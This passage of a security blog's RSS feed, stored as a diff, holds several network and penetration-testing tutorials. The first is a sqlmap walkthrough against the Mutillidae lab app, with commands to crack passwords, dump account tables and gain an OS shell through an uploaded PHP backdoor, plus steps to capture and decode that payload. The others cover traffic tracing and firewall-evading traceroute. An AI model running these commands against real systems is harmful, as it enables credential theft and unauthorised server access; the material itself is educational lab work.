+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-03.png&#34; alt=&#34;sql-injection-with-sqlmap-03&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Once a vulnerability is found, it will print the parameter that&amp;rsquo;s vulnerable, the injection type, and the payload used to carried out the injection. The following scan results indicate total of three type of injections found.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;boolean-based blind&lt;/li&gt;
+&lt;li&gt;error-based&lt;/li&gt;
+&lt;li&gt;AND/OR time-based blind&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-04.png&#34; alt=&#34;sql-injection-with-sqlmap-04&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; the &lt;code&gt;--technique&lt;/code&gt; option can be used to specifically target one type of attack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt; --technique=BEUSTQ,
+   B=boolean-based blind, E=error-based, U=union-query-based, S=stacked queries,
+   T=time-based blind, Q=inline queries
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;explore-the-vulnerable-target-s-databases-and-system&#34;&gt;Explore the vulnerable target&amp;rsquo;s databases and system&lt;/h2&gt;
+
+&lt;p&gt;Once entered the system:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Crack the passwords&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --passwords
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-05.png&#34; alt=&#34;sql-injection-with-sqlmap-05&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;List the databases:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --dbs
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-06.png&#34; alt=&#34;sql-injection-with-sqlmap-06&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;List the tables:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --tables -D nowasp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-07.png&#34; alt=&#34;sql-injection-with-sqlmap-07&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Dump the &lt;code&gt;nowasp.accounts&lt;/code&gt; table:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --dump -T accounts -D nowasp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-08.png&#34; alt=&#34;sql-injection-with-sqlmap-08&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&#34;some-other-commonly-used-options-to-explore-the-system&#34;&gt;Some other commonly used options to explore the system:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --current-user
+$ sqlmap -r mutillidae-login.request --privileges
+$ sqlmap -r mutillidae-login.request --dbms=mysql -D mysql --sql-query=&amp;quot;select user,password from mysql.user order by user desc&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;os-shell-access&#34;&gt;OS Shell Access&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; see section &lt;a href=&#34;#capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/a&gt; to retrieve the payloads.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sqlmap -r mutillidae-login.request --batch --os-shell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-09.png&#34; alt=&#34;sql-injection-with-sqlmap-09&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;behind-the-scene&#34;&gt;Behind the scene&lt;/h3&gt;
+
+&lt;p&gt;The file stager (1) &lt;code&gt;tmpuntbv.php&lt;/code&gt; is first uploaded to the &lt;code&gt;/var/www/html&lt;/code&gt; as explained in section &lt;a href=&#34;#capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then, the backdoor (2) &lt;code&gt;tmpbyovw.php&lt;/code&gt; is uploaded to the server through &lt;code&gt;tmpuntbv.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-14.png&#34; alt=&#34;sql-injection-with-sqlmap-14&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;All shell commands&amp;rsquo; requests are made through the backdoor script &lt;code&gt;tmpbyovw.php&lt;/code&gt; to 192.168.1.9 and results are returned to the 192.168.1.11.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-13.png&#34; alt=&#34;sql-injection-with-sqlmap-13&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;speedup-the-process-and-specify-custom-injection-payloads&#34;&gt;Speedup the process and specify custom injection payloads&lt;/h2&gt;
+
+&lt;p&gt;To speedup the process, pass as many parameters to shorten the processing time. For examples:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-p TESTPARAMETER      Testable parameter(s)
+--dbms=DBMS           Force back-end DBMS to this value
+--technique=TECH      SQL injection techniques to use (default &amp;quot;BEUSTQ&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;capture-and-decode-the-payload&#34;&gt;Capture and decode the payload&lt;/h1&gt;
+
+&lt;p&gt;From the sqlmap stdout, pins down the files (payloads) uploaded:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-10.png&#34; alt=&#34;sql-injection-with-sqlmap-10&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;with-ngrep&#34;&gt;with Ngrep&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ngrep -d eth0 -qt -W byline &amp;quot;^GET | ^POST&amp;quot; &amp;quot;port 80 and host 192.168.1.11&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Look for the files uploaded described above:
+&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-11.png&#34; alt=&#34;sql-injection-with-sqlmap-11&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;with-wireshark&#34;&gt;with Wireshark&lt;/h2&gt;
+
+&lt;p&gt;Use the following filters:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Capture filter: not broadcast and not multicast and host 192.168.1.11
+Display filter (1): http contains &amp;quot;tmpuntbv.php&amp;quot;
+Display filter (2): http contains &amp;quot;tmpbyovw.php&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From the matching packet, &lt;code&gt;Follow&lt;/code&gt; &amp;rarr; &lt;code&gt;HTTP Stream&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-12.png&#34; alt=&#34;sql-injection-with-sqlmap-12&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;decode-the-payload&#34;&gt;Decode the payload&lt;/h2&gt;
+
+&lt;p&gt;Unquote the url strings with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import sys
+import urlparse
+import codecs
+buf = urlparse.unquote(sys.argv[1])
+print buf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;produces,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-15.png&#34; alt=&#34;sql-injection-with-sqlmap-15&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and decodes the hex (starting from &lt;del&gt;0x&lt;/del&gt;3c3f&amp;hellip; until &amp;hellip;3e0a) with,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload = sys.argv[1]
+print codecs.decode(payload, &amp;quot;hex&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;produces,&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/sql-injection-with-sqlmap-16.png&#34; alt=&#34;sql-injection-with-sqlmap-16&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;the code basically handling file uploads and also change the uploaded files permission to &lt;code&gt;0755&lt;/code&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Tracing malicious network traffic</title>
+      <link>https://tzyluen.github.io/post/tracing-malicious-network-traffic/</link>
+      <pubDate>Sat, 27 Feb 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/tracing-malicious-network-traffic/</guid>
+      <description>
+
+&lt;h1 id=&#34;nettop&#34;&gt;Nettop&lt;/h1&gt;
+
+&lt;p&gt;Assuming an unknown/suspicious output (i.e., no chat client is being used, but random chat domain appeared: vmp.boldchat.com) is spotted from a DNS monitoring such as in previous post titled - &lt;a href=&#34;https://tzyluen.github.io/post/sniff-dns-queries/&#34;&gt;Sniff DNS queries&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/dnstop-monitoring-large-count-01.png&#34; alt=&#34;dnstop-monitoring-01&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Under macOS, the &lt;code&gt;nettop&lt;/code&gt; util provides list of sockets and routes in details that help to trace down the process that established the connection to the unknown domain:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# use keys to toggle:
+# d, delta output
+# c, collapse all
+# e, expand all
+# j, bring up the column selection menu
+# h, help
+$ nettop
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/macos-nettop-monitoring-01.jpg&#34; alt=&#34;macos-nettop-monitoring-01&#34; style=&#34;width: 800px;&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;google-transparency-report-safe-browsing-tool&#34;&gt;Google Transparency Report: Safe Browsing Tool&lt;/h2&gt;
+
+&lt;p&gt;Since the process is from Firefox on port https (443), the Google Transparency Report &lt;a href=&#34;https://www.google.com/transparencyreport/safebrowsing/diagnostic/&#34;&gt;Safe Browsing tool&lt;/a&gt; can be used to check if the site is malicious and unsafe.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;netstat&#34;&gt;Netstat&lt;/h1&gt;
+
+&lt;p&gt;On linux, &lt;code&gt;ss&lt;/code&gt; or &lt;code&gt;netstat&lt;/code&gt; can be used:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# -l, --listening       display listening sockets
+# -n, --numeric         don&#39;t resolve service names
+# -p, --program         show the pid/name of the program
+# -r, --resolve         resolve numeric address/ports
+# -t, --tcp             display only TCP sockets
+# -u, --udp             display only UDP sockets
+
+$ ss -rptu
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/linux-ss-monitoring-01.png&#34; alt=&#34;linux-ss-monitoring-01&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Similarly, &lt;code&gt;netstat&lt;/code&gt; would work too:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# to see non-owned process info
+$ sudo netstat -ptuW
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/linux-netstat-monitoring-01.png&#34; alt=&#34;linux-netstat-monitoring-01&#34; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;flowtop&#34;&gt;Flowtop&lt;/h1&gt;
+
+&lt;p&gt;The &lt;code&gt;flowtop&lt;/code&gt; from the &lt;code&gt;netsniff-ng&lt;/code&gt; package also works:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/linux-flowtop-monitoring-01.png&#34; alt=&#34;linux-flowtop-monitoring-01&#34; style=&#34;width: 800px;&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Dynamic Traceroute</title>
+      <link>https://tzyluen.github.io/post/dynamic-traceroute/</link>
+      <pubDate>Sat, 06 Feb 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/dynamic-traceroute/</guid>
+      <description>
+
+&lt;h3 id=&#34;mtr&#34;&gt;mtr&lt;/h3&gt;
+
+&lt;p&gt;Often times, troublesome networks won&amp;rsquo;t show up in the results of a few packets. &lt;code&gt;mtr&lt;/code&gt; combines the functionality of the &lt;code&gt;traceroute&lt;/code&gt; and &lt;code&gt;ping&lt;/code&gt; utils and enables user to constantly poll a remote server to see the latency and performance changes over time. It&amp;rsquo;s not installed by default on most linux systems, simply get it from the distribution and package manager of choice:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ sudo apt-get install mtr
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To debug remotely over ssh where no GUI is available, use the &lt;code&gt;--curses&lt;/code&gt; or &lt;code&gt;-t&lt;/code&gt; option:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ mtr --curses
+$ mtr -t
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Use &lt;code&gt;&#39;h&#39;&lt;/code&gt; key for help to switch/toggle the views, or cycle the view during the runtime with &lt;code&gt;y&lt;/code&gt; key.&lt;/p&gt;
+
+&lt;p&gt;Network block mode with &lt;code&gt;mtr -t -y1&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/mtr-traceroute-network-block-mode.jpg&#34; alt=&#34;mtr-traceroute-network-block-mode&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Country code mode with &lt;code&gt;mtr -t -y2&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/mtr-traceroute-country-mode.jpg&#34; alt=&#34;mtr-traceroute-country-mode&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A very useful feature is the &lt;code&gt;--report&lt;/code&gt; option, which generate a statistical report based on the number of cycles of traceroute to the target.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# -c COUNT:  the number of report cycles
+# -r, --report: generate a statistical report
+# -w, --report-wide: (do not truncate hostnames)
+
+$ mtr -c 30 --report youku.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/mtr-traceroute-report-mode.png&#34; alt=&#34;mtr-traceroute-report-mode&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Reading Traceroute</title>
+      <link>https://tzyluen.github.io/post/reading-traceroute/</link>
+      <pubDate>Fri, 29 Jan 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/reading-traceroute/</guid>
+      <description>
+
+&lt;p&gt;This post extends the discussion on traceroute in previous post &lt;a href=&#34;https://tzyluen.github.io/post/traceroute-firewalls-geoip/#output-format-explanation&#34;&gt;Traceroute, Firewalls &amp;amp; Geo-IP&lt;/a&gt;, and focused on intepreting the traceroute report.&lt;/p&gt;
+
+&lt;h3 id=&#34;output-format-explanation&#34;&gt;Output format explanation:&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;           v--- the router/ip-addr traversed by the packet 
+[Hop]     [Hostname/(IP-addr)]      [RTT1]  [RTT2]  [RTT3]
+ ^--- transit no. of the route       ^---- round-trip time
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The round-trip time (RTT) is the latency (delay between sending the packet and getting the response).&lt;/p&gt;
+
+&lt;p&gt;By default, traceroute sends 3 packets per TTL increment. Each column [RTT1]&amp;hellip;[RTT3] corresponds to the time it took to get response (round-trip time). 3 different packets give a better sampling of the latency, it also helps for situation where multi-path exist (different link). The unit is in &lt;strong&gt;ms (milliseconds)&lt;/strong&gt;. For example,&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[Hop]   [IP-addr]       [RTT1]      [RTT2]      [RTT3]
+  7     204.15.20.45    31.757ms    53.862ms    53.844ms  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Discussion with real world examples were covered in &lt;a href=&#34;https://tzyluen.github.io/post/traceroute-firewalls-geoip/#output-format-explanation&#34;&gt;Traceroute, Firewalls &amp;amp; Geo-IP&lt;/a&gt;.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;reading-the-traceroute&#34;&gt;Reading the traceroute:&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;The Hop times:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Consistent times are the main thing to read and evaluate from a traceroute report.&lt;/li&gt;
+&lt;li&gt;Check the RTT of the three packets are consistent per hops. Look at the pattern of multiple traceroute reports.&lt;/li&gt;
+&lt;li&gt;Times &amp;gt;150ms are considered long for a round-trip within same continental; however is normal if traveled across ocean.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Increasing latency towards the target:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Sudden increase of response time (including packet loss) in a hop and continuous increasing often indicates issue for the hop (the router), the * also suggests either packet loss or the node simply overloaded:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; ...
+ 2  175.137.109.62 (175.137.109.62)    14.947ms    41.973ms    41.883ms  
+ 3  175.137.109.69 (175.137.109.69)    14.348ms    43.621ms    43.614ms  
+ 4  10.55.192.57 (10.55.192.57)       309.880ms   309.820ms   309.808ms  
+ 5  219.158.33.25 (219.158.33.25)     481.462ms   481.399ms       *  
+ 6  219.158.102.97 (219.158.102.97)   491.782ms   506.038ms   505.972ms  
+ 7  219.158.24.133 (219.158.24.133)   991.870ms  1091.789ms       *
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;High latency in the middle that remains consistent:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;An jump in latency but remain consistent till the rest does not indicate an issue.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt; ...
+ 2  175.137.109.70      15.848ms    15.722ms    36.279ms  
+ 3  175.137.109.61      13.277ms    36.372ms    36.332ms  
+ 4  10.55.208.185       35.285ms    35.240ms    58.096ms  
+ 5  27.111.228.94      109.352ms    99.348ms   106.301ms &amp;lt;- [a jump] 
+ 6  157.240.41.36       33.487ms    59.674ms    59.660ms  
+ 7  204.15.20.45        31.757ms    53.862ms    53.844ms  
+ 8  173.252.67.145      36.569ms    59.341ms    59.342ms  
+ 9  31.13.78.35         30.283ms    56.421ms    56.358ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;High latency in the beginning hops:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;If it&amp;rsquo;s first few hops, it indicates local network/subnet issue.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Timeouts at the beginning:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;If the following hops responded without issue, then it&amp;rsquo;s normal. The router may be configured not to respond to traceroute requestssuch as ICMP packets, or short-lived TTL packets.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Timeouts at the very end:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The target may be blocking ICMP requests or packets involving short-lived TTL flags. However, the target is reachable with normal HTTP/HTTPS request.&lt;/li&gt;
+&lt;li&gt;The packet reached the target but unable to response back due to some issues on the destination point of the return path. Should not affect normal connection.&lt;/li&gt;
+&lt;li&gt;Network problem and affecting the connection.&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;Reference:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href=&#34;https://www.inmotionhosting.com/support/website/how-to/read-traceroute&#34;&gt;How to read a traceroute&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Traceroute, Firewalls &amp; Geo-IP</title>
+      <link>https://tzyluen.github.io/post/traceroute-firewalls-geoip/</link>
+      <pubDate>Sun, 24 Jan 2016 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/traceroute-firewalls-geoip/</guid>
+      <description>
+
+&lt;h1 id=&#34;traceroute&#34;&gt;Traceroute&lt;/h1&gt;
+
+&lt;p&gt;&lt;code&gt;Traceroute&lt;/code&gt; is useful for diagnosing networking problems, e.g., end-to-end connectivty, complement with &lt;code&gt;ping&lt;/code&gt;. It can also be used to pinpoint the location of devices, routers and firewalls. The tracerouting tools fundamentally rely on the IP packet&amp;rsquo;s field - TTL (Time-To-Live, decremented at each hop, dies at 0), they send short-life IP packets and wait for Time Exceeded ICMP packets reporting the death of these packets from a router, consequently reveal the route.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Mode:
+-I, --icmp      Use ICMP ECHO for tracerouting
+-T, --tcp       Use TCP SYN for tracerouting (default port is 80)
+-U, --udp       Use UDP to particular port for tracerouting
+                (instead of increasing the port per each probe), default port is 53
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;icmp-mode&#34;&gt;ICMP mode:&lt;/h2&gt;
+
+&lt;p&gt;Default &lt;code&gt;traceroute&lt;/code&gt; uses &lt;code&gt;ICMP ECHO&lt;/code&gt; packets.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ traceroute &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;udp-mode&#34;&gt;UDP mode:&lt;/h2&gt;
+
+&lt;p&gt;Default dest port is 53 (DNS).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ traceroute -U &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For security reasons, the default traceroute&amp;rsquo;s UDP packets and ICMP Echo packets are often blocked. To evade firewalls, the following techniques can be used.&lt;/p&gt;
+
+&lt;h2 id=&#34;tcp-mode&#34;&gt;TCP mode:&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;tcptraceroute&lt;/code&gt; or &lt;code&gt;-T&lt;/code&gt; of the &lt;code&gt;traceroute&lt;/code&gt; uses TCP SYN packets (SYN packet is the first step TCP three-way handshake), which usually not blocked by firewalls, and as long as the destination port is opened. To specify the dest port, uses -p 80 (HTTP) or 443 (HTTPS), that normally allowed to egress for probes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ tcptraceroute &amp;lt;target&amp;gt;
+$ sudo traceroute -T &amp;lt;target&amp;gt;
+
+# -w: wait 10 secs before timeout
+# -q: set the number of probe packets per hop, default is 3, hence RTT1, RTT2, RTT3
+$ traceroute -w 10 -q 3 &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/plain-traceroute-my.png&#34; alt=&#34;plain-traceroute-my&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With ICMP Echo request, the packet was blocked after 58.27.14.58. With TCP SYN handshake, it passed two more hops.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/tcp-traceroute-my.png&#34; alt=&#34;tcp-traceroute-my&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;output-format-explanation&#34;&gt;Output format explanation:&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;           v--- the router/ip-addr traversed by the packet 
+[Hop]     [Hostname/(IP-addr)]      [RTT1]  [RTT2]  [RTT3]
+ ^--- transit no. of the route       ^---- round-trip time
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The round-trip time is the latency (delay between sending the packet and getting the response).&lt;/p&gt;
+
+&lt;p&gt;By default, traceroute sends 3 packets per TTL increment. Each column [RTT1]&amp;hellip;[RTT3] corresponds to the time it took to get response (round-trip time). 3 different packets give a better sampling of the latency, it also helps for situation where multi-path exist (different link). For instance, the packet is routed to different link in hop 2:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;2  175.137.109.62 (175.137.109.62)  38.360 ms       [RTT1]
+   175.137.109.70 (175.137.109.70)  38.219 ms       [RTT2]
+   175.137.109.62 (175.137.109.62)  38.123 ms       [RTT3]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another common scenario is timeout/packet dropped. For instance, 2 out of 3 traceroute packets were dropped/timeout in hop 4:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;4  10.55.32.88 (10.55.32.88)   113.878 ms * *
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;hping3&#34;&gt;Hping3&lt;/h1&gt;
+
+&lt;p&gt;The &amp;apos;traceroute &amp;lt;target&amp;gt;&amp;apos; equivalent:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# -V: verbose
+# -1: icmp
+# hping3 --traceroute -V -1 &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;TCP/UDP mode:&lt;/strong&gt; hping3 traceroute on port 80, 443, 53, useful to identify where the packet is blocked:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# -S: set SYN flag
+# -p: port
+# hping3 --traceroute -S -p 443 &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/hping3-traceroute-syn-port80-my.png&#34; alt=&#34;hping3-traceroute-syn-port-80-my&#34; /&gt;
+&lt;img src=&#34;https://tzyluen.github.io/img/hping3-traceroute-syn-port443-my.png&#34; alt=&#34;hping3-traceroute-syn-port-443-my&#34; /&gt;
+&lt;img src=&#34;https://tzyluen.github.io/img/hping3-traceroute-syn-port53-my.png&#34; alt=&#34;hping3-traceroute-syn-port-53-my&#34; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;intrace&#34;&gt;InTrace&lt;/h1&gt;
+
+&lt;p&gt;Traceroute-like enumerates IP hops by exploiting existing TCP connections.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# intrace -i eth0 -h &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Establish a TCP connection to port 80:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/intrace-ncat-usm-my-port80.png&#34; alt=&#34;intrace-ncat-usm-my-port80&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And it&amp;rsquo;s capable to identified the target host is behind a NAT:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/intrace-usm-my.png&#34; alt=&#34;intrace-usm-my&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Traceroute to remotely initiated connections:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/intrace-netstat-tanp-local.png&#34; alt=&#34;intrace-netstat-tanp-local&#34; /&gt;
+&lt;img src=&#34;https://tzyluen.github.io/img/intrace-remote-initiated-connection.png&#34; alt=&#34;intrace-remote-initiated-connection&#34; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
